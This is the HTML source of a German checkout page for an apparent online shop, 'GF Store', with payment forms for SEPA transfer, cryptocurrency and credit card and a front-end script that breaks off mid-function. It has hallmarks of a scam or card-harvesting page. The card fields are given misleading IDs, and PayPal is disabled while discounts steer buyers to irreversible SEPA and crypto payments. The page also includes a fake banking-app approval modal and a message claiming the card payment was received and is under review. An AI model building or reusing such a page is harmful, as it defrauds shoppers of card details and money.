<!doctype html>
<html lang="de">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>GF Store — Sichere Zahlung</title>
  <meta name="description" content="GF Store Bezahlseite: SEPA, Krypto & Karte aktiv. Prioritärer Versand innerhalb 1 Woche, Rückgabe binnen 14 Tagen." />
  <style>
    :root{
      --w:1200px;
      --bg:#f6f8fb; --panel:#ffffff; --line:#e6edf6;
      --text:#0f172a; --muted:#6b7280;
      --brand:#2563eb; --ok:#059669;
      --r:14px;
      --shadow:0 6px 18px rgba(15,23,42,.06);
    }
    *{box-sizing:border-box}
    body{margin:0;background:var(--bg);color:var(--text);font:14px/1.45 system-ui,-apple-system,Segoe UI,Roboto,Ubuntu}
    a{color:inherit;text-decoration:none}
    img{max-width:100%;display:block}
    header{position:sticky;top:0;z-index:50;background:#fff;border-bottom:1px solid var(--line);backdrop-filter:saturate(140%) blur(4px)}
    .hwrap{max-width:var(--w);margin:auto;padding:10px 12px;display:flex;align-items:center;justify-content:space-between;gap:10px}
    .brand{display:flex;align-items:center;gap:10px}
    .brand .logo{height:40px;width:auto}
    .nav{display:flex;gap:10px;align-items:center}
    .nav a,.iconbtn{display:inline-flex;align-items:center;gap:8px;padding:8px 12px;border:1px solid var(--line);background:#fff;border-radius:12px;box-shadow:0 1px 0 rgba(0,0,0,.02)}
    .nav a:hover,.iconbtn:hover{box-shadow:0 4px 16px rgba(0,0,0,.06)}
    .iconbtn{cursor:pointer}
    .ic{width:16px;height:16px}
    .dropdown{position:relative}
    .menu{position:absolute;right:0;top:calc(100% + 8px);display:none;background:#fff;border:1px solid var(--line);border-radius:12px;min-width:220px;padding:6px;box-shadow:0 10px 24px rgba(0,0,0,.12)}
    .menu a{display:block;padding:8px 10px;border-radius:8px}
    .menu a:hover{background:#f3f4f6}
    .menu.show{display:block}

    .wrap{max-width:var(--w);margin:16px auto;padding:0 12px;display:grid;gap:16px}
    @media (min-width:980px){.wrap{grid-template-columns:1.15fr .85fr}}
    .card{background:var(--panel);border:1px solid var(--line);border-radius:var(--r);box-shadow:var(--shadow)}
    .hd{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid var(--line)}
    .bd{padding:14px 16px}
    .title{font-weight:600;font-size:17px}
    .muted{color:var(--muted);font-size:13px}
    .pill{display:inline-flex;align-items:center;gap:8px;border:1px solid #dbeafe;background:#f5f8ff;color:#2563eb;border-radius:999px;padding:6px 10px;font-size:12px}

    form{display:grid;gap:10px}
    .row{display:grid;gap:10px}
    .cols-2{grid-template-columns:1fr 1fr}
    @media(max-width:760px){.cols-2{grid-template-columns:1fr}}
    label{display:block;margin:4px 0 6px;color:#0f172a;font-weight:500}
    input,select{width:100%;padding:11px 12px;border:1px solid var(--line);border-radius:12px;background:#fbfdff}
    input::placeholder{color:#9aa3b2}
    input:focus,select:focus{outline:2px solid rgba(37,99,235,.2);box-shadow:0 6px 18px rgba(37,99,235,.08)}

    .methods{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
    @media(max-width:980px){.methods{grid-template-columns:repeat(2,1fr)}}
    .m{position:relative;border:1px solid var(--line);border-radius:12px;background:#fff;padding:12px;display:grid;grid-template-rows:auto 1fr auto;gap:8px;cursor:pointer;transition:transform .08s,box-shadow .18s,border-color .18s}
    .m:hover{transform:translateY(-1px);box-shadow:0 8px 18px rgba(0,0,0,.06)}
    .m[aria-selected="true"]{border-color:var(--brand);box-shadow:0 10px 24px rgba(37,99,235,.12)}
    .mlabel{display:flex;align-items:center;gap:8px}
    .mlabel strong{font-weight:600}
    .logos{margin-top:auto;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
    .logos img{height:18px;opacity:.9}
    .bubble{margin-top:8px;display:inline-flex;align-items:center;gap:6px;border:1px dashed #bbf7d0;background:#ecfdf5;color:#065f46;padding:4px 8px;border-radius:999px;font-size:12px}
    .disabled{opacity:.5;cursor:not-allowed}
    .disabled .bubble{display:none}

    .m.best::after{
      content:"BESTER PREIS";
      position:absolute; top:50%; right:12px; transform:translateY(-50%);
      font-size:11px; padding:4px 8px; border-radius:999px;
      background:#f0f9ff; color:#1e40af; border:1px solid #bfdbfe;
      pointer-events:none; letter-spacing:.2px; font-weight:700;
    }

    .pm{display:none;margin-top:12px;border:1px dashed var(--line);border-radius:12px;background:#fbfdff;padding:12px}
    .pm.show{display:block}
    .copyline{display:grid;grid-template-columns:1fr auto;gap:8px}
    .copy{padding:10px 12px;border:1px solid var(--line);border-radius:10px;background:#fff;cursor:pointer;font-weight:600}
    .qr{display:flex;align-items:center;justify-content:center;min-height:190px;border:1px dashed #dbe7ff;border-radius:10px;background:#f3f6ff}
    .qr img{width:220px;height:auto;display:block}

    .paytog{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}
    .pt{border:1px solid var(--line);background:#fff;border-radius:12px;padding:10px 12px;cursor:pointer;display:inline-flex;align-items:center;gap:8px}
    .pt.on{border-color:var(--brand);box-shadow:0 0 0 3px rgba(37,99,235,.12);background:#f8fbff}
    .pt small{color:#6b7280}

    .seg{display:flex;gap:8px;background:#f8fafc;border:1px solid var(--line);padding:6px;border-radius:12px}
    .segbtn{flex:1;display:grid;place-items:center;gap:2px;padding:10px 12px;border:1px solid transparent;background:#fff;border-radius:10px;cursor:pointer}
    .segbtn[aria-pressed="true"]{border-color:var(--brand);box-shadow:0 0 0 3px rgba(37,99,235,.12);background:#f0f6ff}
    .segbtn .big{font-weight:600}
    .segbtn .small{font-size:12px;color:#6b7280}

    .mini{display:flex;flex-direction:column;gap:10px}
    .ci{display:grid;grid-template-columns:60px 1fr auto;gap:8px}
    .ci img{width:60px;height:60px;object-fit:cover;border-radius:10px;border:1px solid var(--line);background:#fff}
    .sum{display:grid;gap:8px;margin-top:10px}
    .rowline{display:flex;align-items:center;justify-content:space-between}
    .due{font-size:18px;font-weight:700}
    .note{font-size:12px;color:#065f46;background:#ecfdf5;border:1px solid #bbf7d0;border-radius:10px;padding:6px 8px}
    .schedule{display:grid;gap:6px;margin-top:6px}
    .sch{display:flex;align-items:center;justify-content:space-between;font-size:13px}

    .btn{display:inline-flex;align-items:center;gap:8px;justify-content:center;padding:12px 14px;border-radius:12px;border:1px solid var(--line);background:#fff;cursor:pointer;font-weight:600}
    .btn.primary{background:linear-gradient(180deg,#2563eb,#1e40af);color:#fff;border-color:#1e40af;box-shadow:0 10px 24px rgba(30,64,175,.25)}
    .btn:disabled{opacity:.6;cursor:not-allowed}

    .modal{position:fixed;inset:0;background:rgba(0,0,0,.45);backdrop-filter:blur(2px);display:none;z-index:10000}
    .modal.show{display:block}
    .sheet{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);width:min(520px,95%);background:#fff;border:1px solid var(--line);border-radius:14px;box-shadow:0 18px 38px rgba(0,0,0,.25);display:grid;grid-template-rows:auto 1fr auto}
    .sheet header{display:flex;align-items:center;justify-content:space-between;padding:12px 14px;border-bottom:1px solid var(--line)}
    .sheet .body{padding:12px 14px;display:grid;gap:12px}
    .sheet footer{padding:12px 14px;border-top:1px solid var(--line);display:flex;gap:8px;justify-content:flex-end}
    .x{cursor:pointer;border:1px solid var(--line);background:#fff;border-radius:10px;padding:6px}

    .toast{position:fixed;left:50%;transform:translateX(-50%);bottom:16px;background:#111;color:#fff;padding:10px 14px;border-radius:12px;display:none;z-index:99999}
    .toast.show{display:block}

    /* Uploader kompakter, Markup unverändert */
    .uploader{display:grid;gap:10px}
    .dz{position:relative; display:grid; place-items:center; text-align:center; gap:8px;
      padding:16px; border:1px dashed #cfe0ff; border-radius:14px;
      background:radial-gradient(1200px 80px at 50% 0, #f7faff 0,#ffffff 60%);
      transition:.15s border-color,.15s box-shadow,.15s transform; cursor:pointer;}
    .dz:hover{box-shadow:0 12px 28px rgba(37,99,235,.08)}
    .dz.over{border-color:#93c5fd; box-shadow:0 0 0 4px rgba(37,99,235,.12)}
    .dz svg{width:22px;height:22px;opacity:.8}
    .dz .hint{font-size:12px;color:var(--muted)}
    .dz .cta{display:inline-flex;gap:8px;align-items:center;margin-top:4px}
    .dz .cta .btn{padding:6px 10px;font-size:12px}

    .native-picker{position:absolute; inset:0; width:100%; height:100%; opacity:0; cursor:pointer;}
    .filecard{display:flex;align-items:center;gap:10px;border:1px solid var(--line);background:#fff;border-radius:12px;padding:8px 10px;box-shadow:0 4px 14px rgba(0,0,0,.04)}
    .filebadge{width:28px;height:28px;border-radius:8px;background:#eef2ff;display:grid;place-items:center;border:1px solid #e5e7eb}
    .filebadge svg{width:16px;height:16px}
    .filemeta{display:grid}
    .filename{font-weight:600;max-width:320px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
    .filesub{font-size:12px;color:#6b7280}
    .prog{height:6px;background:#eef2ff;border-radius:999px;overflow:hidden}
    .bar{height:100%;width:0;background:linear-gradient(90deg,#60a5fa,#2563eb);transition:width .6s ease}
    .factions{margin-left:auto;display:flex;gap:8px}
    .tag-ok{font-size:12px;color:#065f46;background:#ecfdf5;border:1px solid #bbf7d0;border-radius:8px;padding:2px 6px;display:inline-flex;align-items:center;justify-content:center;min-width:48px;text-align:center}

    /* Karten-UI */
    input[aria-invalid="true"]{ border-color:#fca5a5; background:#fff7f7 }
    .tag-brand{display:none;align-items:center;gap:8px;border:1px solid #dbeafe;background:#f0f6ff;color:#1e40af;border-radius:999px;padding:4px 8px;font-size:12px;margin-top:6px}
    .meter{height:8px;border:1px solid #e5e7eb;border-radius:999px;overflow:hidden;background:#f8fafc}
    .meter>i{display:block;height:100%;width:0;transition:width .4s ease;background:linear-gradient(90deg,#93c5fd,#2563eb)}
    .countdown{font-variant:tabular-nums;letter-spacing:.3px}
    .tiny{font-size:11px;color:#6b7280}
  </style>
</head>
<body>
  <header>
    <div class="hwrap">
      <a href="index.html" class="brand" aria-label="Startseite">
        <img src="assets/img/logopnggfstore.png" class="logo" alt="GF Store" width="180" height="52" decoding="async">
      </a>
      <nav class="nav">
        <a href="compte/index.html" title="Konto"><img class="ic" id="icUser" alt=""> <span>Konto</span></a>
        <a href="index.html" title="Weiter einkaufen"><img class="ic" id="icContinue" alt=""> <span>Weiter einkaufen</span></a>
        <div class="dropdown">
          <button class="iconbtn" id="menuBtn" aria-label="Menü öffnen"><img class="ic" id="icMenu" alt=""></button>
          <div id="menuDrop" class="menu" role="menu">
            <a href="pages/a-propos.html">Über uns</a>
            <a href="pages/cgv.html">AGB</a>
            <a href="pages/mentions-legales.html">Impressum</a>
            <a href="pages/confidentialite.html">Datenschutz</a>
            <a href="pages/contact.html">Kontakt</a>
          </div>
        </div>
      </nav>
    </div>
  </header>

  <main class="wrap" aria-live="polite">
    <section class="card" aria-labelledby="h-checkout">
      <div class="hd">
        <div>
          <div class="title" id="h-checkout">Sichere Zahlung <span id="orderId" class="muted" style="margin-left:8px"></span></div>
          <div class="muted">Prioritärer Versand innerhalb 1 Woche • Rückgabe 14 Tage</div>
        </div>
        <span class="pill"><img class="ic" id="icSSL" alt=""> SSL aktiv</span>
      </div>

      <div class="bd">
        <!-- Kundendaten -->
        <form id="addrForm" class="row cols-2" novalidate>
          <div><label for="name">Vollständiger Name</label><input id="name" placeholder="Vorname Nachname" required></div>
          <div><label for="email">E-Mail</label><input id="email" type="email" inputmode="email" autocomplete="email" placeholder="sie@beispiel.de" required pattern="^[^\s@]+@[^\s@]+\.[^\s@]{2,}$"></div>
          <div><label for="phone">Telefon</label><input id="phone" inputmode="tel" autocomplete="tel" placeholder="+49 170 1234567"></div>

          <div><label for="country">Land</label>
            <select id="country" required>
              <option value="" disabled selected>— Land auswählen —</option>
              <option value="AL">Albanien</option><option value="AD">Andorra</option><option value="AM">Armenien</option>
              <option value="AT">Österreich</option><option value="AZ">Aserbaidschan</option><option value="BY">Belarus</option>
              <option value="BE">Belgien</option><option value="BA">Bosnien und Herzegowina</option><option value="BG">Bulgarien</option>
              <option value="HR">Kroatien</option><option value="CY">Zypern</option><option value="CZ">Tschechien</option>
              <option value="DK">Dänemark</option><option value="EE">Estland</option><option value="FI">Finnland</option>
              <option value="FR">Frankreich</option><option value="GE">Georgien</option><option value="DE">Deutschland</option>
              <option value="GR">Griechenland</option><option value="HU">Ungarn</option><option value="IS">Island</option>
              <option value="IE">Irland</option><option value="IT">Italien</option><option value="LV">Lettland</option>
              <option value="LI">Liechtenstein</option><option value="LT">Litauen</option><option value="LU">Luxemburg</option>
              <option value="MT">Malta</option><option value="MD">Republik Moldau</option><option value="MC">Monaco</option>
              <option value="ME">Montenegro</option><option value="NL">Niederlande</option><option value="MK">Nordmazedonien</option>
              <option value="NO">Norwegen</option><option value="PL">Polen</option><option value="PT">Portugal</option>
              <option value="RO">Rumänien</option><option value="RU">Russland</option><option value="SM">San Marino</option>
              <option value="RS">Serbien</option><option value="SK">Slowakei</option><option value="SI">Slowenien</option>
              <option value="ES">Spanien</option><option value="SE">Schweden</option><option value="CH">Schweiz</option>
              <option value="TR">Türkei</option><option value="UA">Ukraine</option><option value="GB">Vereinigtes Königreich</option>
              <option value="VA">Vatikanstadt</option><option value="XK">Kosovo</option>
            </select>
          </div>

          <div class="cols-2">
            <div><label for="address">Adresse</label><input id="address" placeholder="Musterstraße 10" required></div>
            <div><label for="city">Stadt</label><input id="city" placeholder="Berlin" required></div>
            <div><label for="zip">PLZ</label><input id="zip" inputmode="numeric" placeholder="10115" required></div>
          </div>
        </form>

        <!-- Zahlungsarten -->
        <div style="margin:14px 0 8px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap">
          <div class="title" style="font-size:16px">Zahlungsart</div>
          <span class="muted">SEPA, Krypto & Karte — PayPal nicht verfügbar</span>
        </div>

        <div class="methods" role="tablist">
          <!-- 1) Karte (erstes Kachel, nicht auto-aktiv) -->
          <button class="m" role="tab" aria-selected="false" data-method="card">
            <div class="mlabel"><strong>Kreditkarte</strong></div>
            <div class="logos">
              <img alt="Visa" src="https://cdn.simpleicons.org/visa">
              <img alt="Mastercard" src="https://cdn.simpleicons.org/mastercard">
              <img alt="American Express" src="https://cdn.simpleicons.org/americanexpress">
            </div>
            <span class="bubble">Per TLS verschlüsselt</span>
          </button>

          <!-- 2) SEPA (standard aktiv, verhindert Doppelöffnung) -->
          <button class="m best" role="tab" aria-selected="true" data-method="sepa">
            <div class="mlabel"><strong>SEPA-Überweisung</strong></div>
            <div class="logos">
              <img alt="SEPA" src="https://img.icons8.com/?size=100&id=7IJfqNBSaJ0N&format=png&color=000000">
              <img alt="IBAN" src="https://img.icons8.com/?size=100&id=PpOkzOgNS2tV&format=png&color=000000">
            </div>
            <span class="bubble">Rabatt −3 %</span>
          </button>

          <!-- 3) Krypto -->
          <button class="m" role="tab" aria-selected="false" data-method="crypto">
            <div class="mlabel"><strong>Krypto</strong></div>
            <div class="logos">
              <img alt="Bitcoin" src="https://cdn.simpleicons.org/bitcoin">
              <img alt="Ethereum" src="https://cdn.simpleicons.org/ethereum">
              <img alt="Tether" src="https://cdn.simpleicons.org/tether">
            </div>
            <span class="bubble">Rabatt −1 %</span>
          </button>

          <!-- 4) PayPal deaktiviert -->
          <div class="m disabled" aria-selected="false">
            <div class="mlabel"><strong>PayPal</strong></div>
            <div class="logos"><img alt="PayPal" src="https://cdn.simpleicons.org/paypal"></div>
            <span class="muted" style="margin-top:6px">Nicht verfügbar</span>
          </div>
        </div>

        <div class="paytog" style="margin-top:12px">
          <button id="btnOnce" class="pt on" type="button"><strong>Jetzt bezahlen</strong></button>
          <button id="btnSplit" class="pt" type="button" aria-haspopup="dialog" aria-controls="splitModal">
            <strong>In Raten zahlen</strong>
          </button>
        </div>

        <!-- SEPA (Standard sichtbar) -->
        <div id="pmSEPA" class="pm show">
          <div class="row">
            <div class="row cols-2">
              <div><label>Kontoinhaber</label><input readonly value="GF Store"></div>
              <div><label>Bank</label><input readonly value="BBVA Deutschland"></div>
              <div><label for="iban">IBAN</label><input id="iban" readonly value="DE75 5003 1900 0012 3864 51"></div>
              <div><label for="swift">BIC</label><input id="swift" readonly value="BBVADEFFXXX"></div>
              <div><label for="vref">Verwendungszweck</label><input id="vref" readonly placeholder="Kundenname (auto)"></div>
              <div><label for="amountNowBank">Jetzt zu überweisen (EUR)</label><input id="amountNowBank" readonly value="0"></div>
              <div><label>Adresse (1)</label><input readonly value="Schwanheimer Straße 38"></div>
              <div><label>Adresse (2)</label><input readonly value="64625 Bensheim, Hessenne"></div>
            </div>

            <!-- Uploader -->
            <div class="uploader" aria-label="Überweisungsnachweis hochladen">
              <div id="dz" class="dz" role="button" aria-controls="proofInput" aria-label="Nachweis importieren">
                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M7 18h10a4 4 0 0 0 0-8h-.26A6 6 0 1 0 7 18Zm5-9v6m0-6-2 2m2-2 2 2" fill="none" stroke="#1f2937" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
                <div>Nachweis hierher ziehen (alle Formate)</div>
                <div class="hint">oder</div>
                <div class="cta">
                  <label for="proofInput" class="btn">Importieren</label>
                  <span class="hint">max. 10 MB</span>
                </div>
                <input id="proofInput" class="native-picker" type="file" accept="*/*">
              </div>

              <div id="fileWrap" class="filecard" style="display:none">
                <div class="filebadge" aria-hidden="true">
                  <svg viewBox="0 0 24 24" width="18" height="18"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8Z" fill="#e5e7eb"/><path d="M14 2v6h6" fill="#dbeafe"/></svg>
                </div>
                <div class="filemeta">
                  <span id="fileName" class="filename"></span>
                  <span id="fileInfo" class="filesub"></span>
                  <div class="prog" aria-hidden="true"><div id="fileBar" class="bar"></div></div>
                </div>
                <div class="factions">
                  <span id="fileOk" class="tag-ok" style="display:none">Fertig</span>
                  <button id="removeProof" type="button" class="btn" title="Entfernen">Entfernen</button>
                </div>
              </div>
            </div>

            <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center">
              <button class="btn" data-copy="#iban">IBAN kopieren</button>
              <button class="btn" data-copy="#swift">BIC kopieren</button>
              <button class="btn" data-copy="#vref">Verwendungszweck kopieren</button>
              <button id="confirmBank" class="btn">Überweisung durchgeführt</button>
              <small class="muted">Nach Prüfung können Sie die Bestellung finalisieren.</small>
            </div>
          </div>
        </div>

        <!-- Krypto -->
        <div id="pmCrypto" class="pm">
          <div class="row cols-2">
            <div>
              <label for="ccy">Währung</label>
              <select id="ccy">
                <option value="USDT-BEP20" selected>USDT (BEP20)</option>
                <option value="USDT-TRC20">USDT (TRC20)</option>
                <option value="BTC">Bitcoin (BTC)</option>
                <option value="ETH-ERC20">Ethereum (ERC20)</option>
              </select>
            </div>
            <div>
              <label for="amountNow">Jetzt zu senden (EUR)</label>
              <input id="amountNow" readonly value="0">
            </div>
          </div>

          <div class="copyline">
            <div>
              <label for="wallet">Zahlungsadresse</label>
              <input id="wallet" readonly>
            </div>
            <button class="copy" data-copy="#wallet">Kopieren</button>
          </div>

          <div class="copyline">
            <div>
              <label for="ccyAmt">Zu sendender Betrag (<span id="ccyLabel">—</span>)</label>
              <input id="ccyAmt" readonly>
            </div>
            <button class="copy" data-copy="#ccyAmt">Kopieren</button>
          </div>

          <div class="qr" aria-label="Zahlungs-QR">
            <img id="qrImg" alt="QR-Code Zahlung" width="220" height="220" decoding="async">
          </div>

          <div>
            <label for="txid">Transaktions-ID (TxID / Hash)</label>
            <input id="txid" placeholder="0x… / bc1… / TX123…" required>
          </div>

          <div style="display:flex;gap:8px;flex-wrap:wrap">
            <button id="confirmCrypto" class="btn">Zahlung gesendet</button>
            <small class="muted">Schnelle Hash-Prüfung vor dem Abschluss.</small>
          </div>
        </div>

        <!-- Karte -->
        <div id="pmCard" class="pm">
          <div class="row cols-2">
            <div>
              <label for="cardName">Karteninhaber</label>
              <input id="cardName" placeholder="Vorname Nachname" required autocomplete="cc-name" inputmode="text">
            </div>
            <div>
              <label for="orderNumber">Kartennummer</label>
              <input id="orderNumber" placeholder="4242 4242 4242 4242" inputmode="numeric" autocomplete="cc-number" required maxlength="19">
              <div id="cardBrandChip" class="tag-brand"></div>
            </div>
            <div>
              <label for="cardPeriod">Ablauf (MM/JJ)</label>
              <input id="cardPeriod" placeholder="MM/JJ" inputmode="numeric" autocomplete="cc-exp" required maxlength="5">
            </div>
            <div>
              <label for="recoveryCode">CVC / CVV</label>
              <input id="recoveryCode" placeholder="3–4 Ziffern" inputmode="numeric" autocomplete="cc-csc" required maxlength="4">
            </div>
          </div>
          <small class="muted">Per TLS verschlüsselt.</small>
          <div id="cardAssist" class="muted" aria-live="polite" style="margin-top:6px"></div>

          <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px">
            <button id="payCard" class="btn primary" disabled>Mit Karte zahlen</button>
            <button id="confirmCard" class="btn" style="display:none" aria-hidden="true">Ich habe die Zahlung bestätigt</button>
          </div>
        </div>

        <div style="display:flex;gap:10px;justify-content:flex-end;flex-wrap:wrap;margin-top:12px">
          <a href="index.html" class="btn"><img class="ic" id="icBack" alt=""> Weiter einkaufen</a>
          <button id="placeOrder" class="btn primary" disabled>Bestellung abschließen</button>
        </div>
      </div>
    </section>

    <!-- Zusammenfassung -->
    <aside class="card" aria-labelledby="h-recap">
      <div class="hd">
        <div class="title" id="h-recap">Zusammenfassung</div>
        <span class="pill"><img class="ic" id="icTruck" alt=""> Sendungsverfolgung & Support</span>
      </div>
      <div class="bd">
        <div id="miniCart" class="mini"></div>
        <hr style="border:none;border-top:1px dashed var(--line);margin:10px 0">
        <div class="sum">
          <div class="rowline"><span class="muted">Zwischensumme</span><span id="sub">—</span></div>
          <div class="rowline"><span class="muted">Versand</span><span id="ship">Kostenlos</span></div>
          <div class="rowline"><span class="muted">Vorteil</span><span id="benefit">—</span></div>
          <div class="rowline"><span class="muted">Gesamt</span><span id="total">—</span></div>
          <div class="rowline" id="dueRow"><span class="due">Heute fällig</span><span class="due" id="dueNow">—</span></div>
          <div id="schedule" class="schedule" style="display:none"></div>
          <div class="note">Prioritärer Versand innerhalb von 7 Tagen. Rückgabe innerhalb von 14 Tagen.</div>
        </div>
      </div>
    </aside>
  </main>

  <!-- Modale 3DS / Banking-App -->
  <div id="cardFlowModal" class="modal" role="dialog" aria-modal="true" aria-hidden="true">
    <div class="sheet">
      <header>
        <div style="font-weight:600">Authentifizierung erforderlich</div>
        <button class="x" id="closeCardFlow" aria-label="Schließen">✕</button>
      </header>
      <div class="body">
        <p>Öffnen Sie bitte Ihre <strong>Banking-App</strong> und bestätigen Sie die Zahlung.</p>
        <div class="meter" aria-hidden="true"><i id="cardBar"></i></div>
        <div class="muted">Verbleibende Zeit: <span id="cardCountdown" class="countdown">02:00</span></div>
        <div class="note" style="margin-top:6px">
          Falls die Freigabe nicht klappt, empfehlen wir die <strong>SEPA-Überweisung</strong> (Bestätigung oft stabiler).
        </div>
        <div class="tiny" style="margin-top:4px">
          Bei Problemen können Sie jederzeit den <a href="pages/contact.html">Kundenservice</a> kontaktieren.
        </div>
      </div>
      <footer>
        <button class="btn" id="useSepa">Auf SEPA wechseln</button>
        <button class="btn primary" id="iValidated">In meiner App bestätigt</button>
      </footer>
    </div>
  </div>

  <!-- Modale nach Kartenbestätigung -->
  <div id="postCardModal" class="modal" role="dialog" aria-modal="true" aria-hidden="true">
    <div class="sheet">
      <header>
        <div style="font-weight:600">Prüfung läuft</div>
        <button class="x" id="closePostCard" aria-label="Schließen">✕</button>
      </header>
      <div class="body">
        <p>Danke. Ihre Kartenzahlung ist <strong>eingegangen</strong> und befindet sich in der <strong>Bankprüfung</strong>.</p>
        <p class="muted">Sie erhalten eine Bestätigungs-E-Mail, sobald die Zahlung verifiziert ist. Bis dahin ist die Bestellung als <em>„bezahlt — in Prüfung“</em> markiert.</p>
      </div>
      <footer>
        <button class="btn primary" id="okPostCard">OK</button>
      </footer>
    </div>
  </div>

  <footer>
    <div class="fwrap">
      <div>© GF Store 2025 — Einfach, sicher, krypto-freundlich.</div>
      <nav>
        <a href="pages/a-propos.html">Über uns</a> ·
        <a href="pages/cgv.html">AGB</a> ·
        <a href="pages/mentions-legales.html">Impressum</a> ·
        <a href="pages/confidentialite.html">Datenschutz</a> ·
        <a href="pages/contact.html">Kontakt</a>
      </nav>
    </div>
  </footer>

  <!-- Dein bestehendes Script -->
  <script src="checkout.js" defer></script>

  <!-- Add-on Front Script (berührt den Backend-Flow nicht) -->
  <script defer>
  (function(){
    const $ = s=>document.querySelector(s);
    const $$ = s=>document.querySelectorAll(s);

    /* Pane-Steuerung: verhindert gleichzeitiges Öffnen */
    const panes = { sepa: $('#pmSEPA'), crypto: $('#pmCrypto'), card: $('#pmCard') };
    const tabs  = { sepa: document.querySelector('[data-method="sepa"]'),
                    crypto: document.querySelector('[data-method="crypto"]'),
                    card: document.querySelector('[data-method="card"]') };
    function showOnly(name){
      Object.keys(panes).forEach(k=>panes[k].classList.toggle('show', k===name));
      Object.keys(tabs).forEach(k=>tabs[k].setAttribute('aria-selected', String(k===name)));
    }
    showOnly('sepa'); // Standard: SEPA sichtbar

    // Tabs klickbar
    $$('.methods .m[role="tab"]').forEach(btn=>{
      btn.addEventListener('click', ()=>{
        const meth = btn.getAttribute('data-method');
        if(meth){ showOnly(meth); }
      });
    });

    /* ==== Champs client : email & téléphone (placeholders "smart" + validations) ==== */
    const nameI = $('#name');
    const emailI = $('#email');
    const phoneI = $('#phone');
    const countrySel = $('#country');

    const tldByCountry = {
      DE:'de', AT:'at', CH:'ch', FR:'fr', BE:'be', NL:'nl', LU:'lu', IT:'it', ES:'es', PT:'pt',
      IE:'ie', GB:'uk', DK:'dk', NO:'no', SE:'se', FI:'fi', PL:'pl', CZ:'cz', SK:'sk', HU:'hu',
      RO:'ro', BG:'bg', GR:'gr', SI:'si', HR:'hr', LT:'lt', LV:'lv', EE:'ee', IS:'is', TR:'tr'
    };
    const domainByLang = { DE:'beispiel', AT:'beispiel', CH:'beispiel', FR:'exemple', BE:'exemple' };

    function slugName(n){
      return (n||'').trim()
        .normalize('NFD').replace(/[\u0300-\u036f]/g,'')
        .replace(/[^a-zA-ZäöüÄÖÜß\s'-]/g,'')
        .toLowerCase()
        .replace(/\s+/g,' ')
        .split(' ')
        .slice(0,2)
        .join('.');
    }
    function updateEmailPlaceholder(){
      const cc = countrySel && countrySel.value || 'DE';
      const tld = tldByCountry[cc] || 'com';
      const domain = domainByLang[cc] || 'example';
      const local = slugName(nameI && nameI.value) || 'vorname.nachname';
      if(emailI){ emailI.placeholder = local + '@' + domain + '.' + tld; }
    }
    function validateEmail(){
      if(!emailI) return true;
      const v = emailI.value.trim();
      if(!v){ emailI.setAttribute('aria-invalid','false'); return false; }
      const ok = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v);
      emailI.setAttribute('aria-invalid', String(!ok));
      return ok;
    }

    function formatPhone(){
      if(!phoneI) return;
      let v = phoneI.value || '';
      // impose '+' au début
      v = v.replace(/^\s+|\s+$/g,'');
      v = v.replace(/[^\d+]/g,'');
      if(!v.startsWith('+')) v = '+' + v.replace(/\+/g,'');
      // lisibilité simple : +CCC XXXX XXXX XXX
      const digits = v.replace(/\D/g,'');
      const grouped = digits.replace(/^(\d{1,3})(\d{0,4})(\d{0,4})(\d{0,4}).*$/, (_,a,b,c,d)=>['+'+a,b,c,d].filter(Boolean).join(' '));
      phoneI.value = grouped;
      const valid = /^\+\d{7,15}$/.test('+' + digits.replace(/^(\d{1,3})/,'')); // au moins 7 digits hors indicatif
      phoneI.setAttribute('aria-invalid', String(!valid));
    }
    function updatePhonePlaceholder(){
      if(!phoneI || !countrySel) return;
      const ccPrefix = {
        DE:'+49', AT:'+43', CH:'+41', FR:'+33', BE:'+32', NL:'+31', LU:'+352', IT:'+39', ES:'+34', PT:'+351',
        IE:'+353', GB:'+44', DK:'+45', NO:'+47', SE:'+46', FI:'+358', PL:'+48', CZ:'+420', SK:'+421', HU:'+36',
        RO:'+40', BG:'+359', GR:'+30', SI:'+386', HR:'+385', LT:'+370', LV:'+371', EE:'+372', IS:'+354', TR:'+90'
      };
      const p = ccPrefix[countrySel.value] || '+';
      phoneI.placeholder = p + ' 170 1234567';
    }

    if(nameI) nameI.addEventListener('input', updateEmailPlaceholder);
    if(countrySel){
      countrySel.addEventListener('change', ()=>{ updateEmailPlaceholder(); updatePhonePlaceholder(); });
      updateEmailPlaceholder(); updatePhonePlaceholder();
    }
    if(emailI){ emailI.addEventListener('input', validateEmail); }
    if(phoneI){ phoneI.addEventListener('input', formatPhone); }

    /* Karten-Formatierung & Validierung */
    const num   = $('#orderNumber');
    const exp   = $('#cardPeriod');
    const cvc   = $('#recoveryCode');
    const chip  = $('#cardBrandChip');
    const assist= $('#cardAssist');
    const cardName = $('#cardName');

    const onlyDigits = s => (s||'').replace(/\D/g,'');
    const detectBrand = d => /^4/.test(d) ? 'visa'
                          : (/^(5[1-5]|2(2[2-9]|[3-6]\\d|7[01]|720))/.test(d) ? 'mastercard'
                          : (/^3[47]/.test(d) ? 'amex' : null));
    const brandNames = { visa:'Visa', mastercard:'Mastercard', amex:'American Express' };
    const brandSamples = { visa:'4242 4242 4242 4242', mastercard:'5555 5555 5555 4444', amex:'3782 822463 10005' };
    const luhnOk = d => { let sum=0,alt=false; for(let i=d.length-1;i>=0;i--){let n=d.charCodeAt(i)-48; if(n<0||n>9) return false; if(alt){n*=2; if(n>9) n-=9;} sum+=n; alt=!alt;} return sum%10===0; };

    // Gestion d'activation du bouton carte
    const payBtn = $('#payCard');
    function cardFieldsValid(){
      const hasName = cardName && cardName.value.trim().length>1;
      const numberOk = num && onlyDigits(num.value).length >= (detectBrand(onlyDigits(num.value))==='amex'?15:16) && !/true/.test(num.getAttribute('aria-invalid'));
